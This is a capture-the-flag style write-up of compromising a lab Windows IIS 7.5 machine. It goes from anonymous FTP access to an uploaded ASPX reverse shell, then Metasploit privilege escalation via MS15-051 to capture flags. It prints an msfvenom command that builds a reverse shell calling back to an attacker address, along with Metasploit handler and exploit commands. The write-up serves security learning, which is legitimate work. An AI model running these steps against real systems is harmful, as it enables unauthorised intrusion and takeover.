1.  Run Nmap to discover any interesting open ports from the web server.
![image](https://github.com/LawsonSchwantz/Writeups/assets/74954683/dee42697-4562-4730-9aa2-7a049254a00b)

2. The web using IIS 7.5 and there are some vulnerabillities that are related to the services.
![image](https://github.com/LawsonSchwantz/Writeups/assets/74954683/3cf4a592-3223-4bee-97b7-606722736c03)

3. Realizes that port 21 inside the web server is opened. Let's sign in with user name anonymous and just blank for the password.
![image](https://github.com/LawsonSchwantz/Writeups/assets/74954683/833abcbe-1c65-46bb-982e-65f5dc0a7ef9)

4. Checking any interesting information and found some file. I tried to opened in my browser and it works!
![image](https://github.com/LawsonSchwantz/Writeups/assets/74954683/23a1d4db-ba4e-4c39-86c8-6a931384bd0f)

Proof:
![image](https://github.com/LawsonSchwantz/Writeups/assets/74954683/cc3b2bf9-9c3e-4717-bb56-71e961fcb2e1)

5. Because of this vuln, I make a new payload file for reverse shell with help of msfvenom and transfer it to victim FTP and run the file.

Command: msfvenom -p windows/shell_reverse_tcp lhost=10.10.14.22 lport=777 -f aspx > payload.aspx
![image](https://github.com/LawsonSchwantz/Writeups/assets/74954683/d11f9518-c840-4a5d-a61a-876d55ea2016)


Victim Terminal (Use put to transfer the file):<br>
![image](https://github.com/LawsonSchwantz/Writeups/assets/74954683/98972545-bbdc-4471-a666-328716957e64)

Run:<br> 
Command: http://10.10.10.5/payload.aspx<br>
![image](https://github.com/LawsonSchwantz/Writeups/assets/74954683/17f85445-4d56-4e8f-b3db-79539a970c7a)

6. Yes, i successfuly take the victim shell, but unfortunately, user directory cannot be access.
![image](https://github.com/LawsonSchwantz/Writeups/assets/74954683/5d606960-ac08-4a9e-b0a3-9fab8d0b0717)

7. It's a dead end. To resolve this, I use suggester to find anything that vulnerable inside the web with following commands.
![image](https://github.com/LawsonSchwantz/Writeups/assets/74954683/54996220-7a8f-4475-855e-b46a1d3a4976)

Command 1: use exploit/multi/handler <br>
Command 2: set payload windows/meterpreter/reverse_tcp <br>
Command 3: SET LHOST and LPORT <br>
Command 4: run post/multi/recon/local_exploit_suggester<br>

![image](https://github.com/LawsonSchwantz/Writeups/assets/74954683/99350759-4512-48d1-beeb-f364e809f10e)

Result:<br>
![image](https://github.com/LawsonSchwantz/Writeups/assets/74954683/f1603a3c-4ef0-4498-ba3f-41f4ee885313)
![image](https://github.com/LawsonSchwantz/Writeups/assets/74954683/bb6f5413-30bc-4d7b-bfef-fc3383399c08)

8. The ms15 exploit payload looks interesting which is about client copy image script. Let's use it.

Payload: exploit/windows/local/ms15_051_client_copy_image

![image](https://github.com/LawsonSchwantz/Writeups/assets/74954683/6e719dd0-975a-4d3f-9c00-6a859bbca416)

Result: <br>
![image](https://github.com/LawsonSchwantz/Writeups/assets/74954683/5697ae40-ec0d-4901-9182-562c6fdeb197)

9. I successfuly gained the root privelege with the script. The user flag can be found in /babis/Desktop/user.txt.
![image](https://github.com/LawsonSchwantz/Writeups/assets/74954683/c4b8d9a6-1b79-4176-b5b9-45e7a5c14c94)

10. For the root flag is located in /Administrator/Desktop/root.txt.
![image](https://github.com/LawsonSchwantz/Writeups/assets/74954683/abf81c41-6a08-4396-9d0b-8b9cb20a12f6)



















